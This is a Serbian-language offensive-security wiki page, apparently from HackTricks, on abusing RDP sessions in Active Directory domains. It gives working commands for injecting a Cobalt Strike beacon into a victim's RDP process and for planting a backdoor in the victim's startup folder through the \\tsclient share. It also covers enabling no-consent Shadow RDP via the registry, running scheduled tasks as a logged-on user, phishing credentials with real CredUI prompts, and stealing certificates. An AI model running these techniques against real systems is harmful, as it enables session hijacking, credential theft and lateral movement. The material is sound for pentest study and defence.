# Zloupotreba RDP sesija

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Ako **spoljna grupa** ima **RDP pristup** **računaru** u trenutnom domenu, napadač koji kompromituje taj računar može da sačeka da se član grupe poveže.

Kada se korisnik poveže putem RDP-a, **napadač može da pređe u sesiju tog korisnika** i zloupotrebi njegove dozvole u spoljnom domenu.

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

Proverite **druge načine za krađu sesija pomoću drugih alata** [**na ovoj stranici.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## Relay autentifikacije između sesija

**Aktivna konzolna ili RDP sesija** drugog korisnika domena takođe može biti korisna kada imate shell sa nižim privilegijama na istom hostu. DCOM aktivacija između sesija može navesti odgovarajući COM server u toj interaktivnoj sesiji da se autentifikuje, a alati kao što su RemotePotato0 ili KrbRelay mogu da uhvate ili proslede tu autentifikaciju. Prijavljeni korisnik ne mora biti administrator domena: usko definisano pravo u direktorijumu, poput dozvole za čitanje lozinke kojom se upravlja preko gMSA, može biti dovoljno za dalji pivot.<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

Počnite od ID-ja sesije i identiteta iz komande `query user`, `qwinsta` ili postojećeg popisa sesija u winPEAS-u. Tretirajte ih kao **kandidate**, a ne kao dokaz da postoji putanja za relay. Važni su COM klasa, nivoi impersonacije i autentifikacije, dostupnost sesije, usmeravanje kroz firewall/OXID, zaštite ciljnog protokola i efektivna prava prijavljenog korisnika. KrbRelay dokumentuje primere za LDAP, HTTP, SMB i NTLM između sesija, ali te putanje zavise od verzije i konfiguracije. LDAP channel binding je još jedna prepreka za relay na ciljnom sistemu. Konkretno, projekat RemotePotato0 navodi da je njegov prvobitni scenario RPC-to-LDAP eksploatacije ispravljen 2022. godine; nemojte zaključivati da je LDAP relay uspešan samo na osnovu vidljive sesije.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

Ako korisnik pristupi **mašini preko RDP-a** dok ga **napadač** tamo **čeka**, napadač će moći da **ubaci beacon u korisnikovu RDP sesiju**, a ako je **žrtva montirala svoj disk** prilikom pristupa preko RDP-a, **napadač bi mogao da mu pristupi**.

U tom slučaju možete jednostavno **kompromitovati** **originalni računar žrtve** tako što ćete u **fasciklu za pokretanje** upisati **backdoor**.

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

Ako ste **local admin** na hostu na kom žrtva već ima **aktivnu RDP sesiju**, možda ćete moći da **pregledate/upravljate tom radnom površinom bez krađe lozinke ili dumpovanja LSASS-a**.<sup>[[1]](#references)</sup>

Ovo zavisi od **Remote Desktop Services shadowing** smernica sačuvanih u:<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

Zanimljive vrednosti:

- `0`: Onemogućeno
- `1`: `EnableInputNotify` (kontrola, potrebno je odobrenje korisnika)
- `2`: `EnableInputNoNotify` (kontrola, **nije potrebno odobrenje korisnika**)
- `3`: `EnableNoInputNotify` (samo za pregled, potrebno je odobrenje korisnika)
- `4`: `EnableNoInputNoNotify` (samo za pregled, **nije potrebno odobrenje korisnika**)

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

Ovo je posebno korisno kada je privilegovani korisnik povezan preko RDP-a ostavio otključanu radnu površinu, KeePass sesiju, MMC konzolu, sesiju pregledača ili administratorsku ljusku otvorenu.

## Scheduled Tasks As Logged-On User

Ako ste **lokalni admin**, a ciljni korisnik je **trenutno prijavljen**, Task Scheduler može da pokrene kod **kao taj korisnik, bez njegove lozinke**.<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

Time se postojeća sesija žrtve pretvara u primitivu za izvršavanje:

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

Notes:

- Ako korisnik **nije prijavljen**, Windows obično zahteva lozinku za kreiranje zadatka koji se izvršava kao taj korisnik.
- Ako je korisnik **prijavljen**, zadatak može ponovo da koristi postojeći kontekst prijave.
- Ovo je praktičan način da se izvrše GUI radnje ili pokrenu binarne datoteke unutar sesije žrtve bez pristupa LSASS-u.

## Zloupotreba CredUI prompta iz sesije žrtve

Kada možete da izvršavate kod **unutar interaktivne radne površine žrtve** (na primer, putem **Shadow RDP-a** ili **zakazanog zadatka koji se izvršava kao taj korisnik**), možete da prikažete **pravi Windows prompt za akreditive** pomoću CredUI API-ja i prikupite akreditive koje žrtva unese.<sup>[[1]](#references)</sup>

Relevantni API-ji:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Uobičajeni tok:

1. Pokrenite binarnu datoteku u sesiji žrtve.
2. Prikažite prompt za domenску autentifikaciju koji odgovara brendiranju trenutnog domena.
3. Raspakujte vraćeni bafer za autentifikaciju.
4. Proverite unete akreditive i po želji nastavite da prikazujete prompt dok se ne unesu važeći akreditivi.

Ovo je korisno za **phishing na hostu** jer prompt prikazuju standardni Windows API-ji, a ne lažni HTML obrazac.

## Zahtevanje PFX-a u kontekstu žrtve

Isti primitiv **zakazanog zadatka koji se izvršava kao korisnik** može da se koristi za zahtevanje **sertifikata/PFX-a kao prijavljene žrtve**. Taj sertifikat kasnije može da se koristi za **AD autentifikaciju** kao taj korisnik, čímе se u potpunosti izbegава крађа лозинке.<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

Tok na visokom nivou:

1. Steknite **lokalne admin** privilegije na hostu na kom je žrtva prijavljena.
2. Pokrenite logiku za upis/izvoz kao žrtva pomoću **zakazanog zadatka**.
3. Izvezite dobijeni **PFX**.
4. Upotrebite PFX za PKINIT / AD autentifikaciju zasnovanu na sertifikatu.

Pogledajte AD CS stranice za naknadnu zloupotrebu:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - Od ravnih mreža do zaključanih domena pomoću modela tiering-a](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn – opcije `mstsc` shadow-session-a](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec - PR za Shadow RDP plugin #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - modul schtask_as](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - PR za zahtevanje PFX-a putem zakazanog zadatka #908](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 - DCOM aktivacija između sesija i trenutna ograničenja](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay - primeri relay-a između sesija i zahtevi za CLSID](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft - komanda query session](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft - atribut ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft - vezivanje LDAP kanala i zaštita od relay napada](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
